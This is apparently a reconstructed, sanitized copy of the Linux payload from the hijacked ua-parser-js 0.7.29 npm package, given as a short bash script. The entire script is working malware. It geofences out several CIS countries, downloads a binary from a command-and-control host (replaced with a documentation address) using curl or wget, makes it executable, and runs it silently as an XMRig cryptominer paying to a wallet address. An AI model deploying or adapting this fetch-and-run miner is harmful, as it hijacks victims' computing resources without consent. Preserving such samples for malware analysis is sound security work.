#!/bin/bash
# ua-parser-js@0.7.29 — Linux payload (reconstructed, sanitized)
# Downloads XMRig crypto miner, excludes CIS countries via geofencing
# Original C2: 159.148.186.228 → replaced with 198.51.100.1 (RFC 5737)

IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\|UA\|BY\|KZ')
if [ -z "$IP" ]
    then
    var=$(pgrep jsextension)
    if [ -z "$var" ]
        then
        curl http://198.51.100.1/download/jsextension -o jsextension
        if [ ! -f jsextension ]
            then
            wget http://198.51.100.1/download/jsextension -O jsextension
        fi
        chmod +x jsextension
        ./jsextension -k --tls --rig-id q -o pool.evil.example.com:443 -u 49ay9Aq2r3diJtEk3eeKKm7pc5R39AKnbYJZVqAd1UUmew6ZPX1ndfXQCT16v4trWp4erPyXtUQZTHGjbLXWQdBqLMxxYKH --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &
    fi
fi
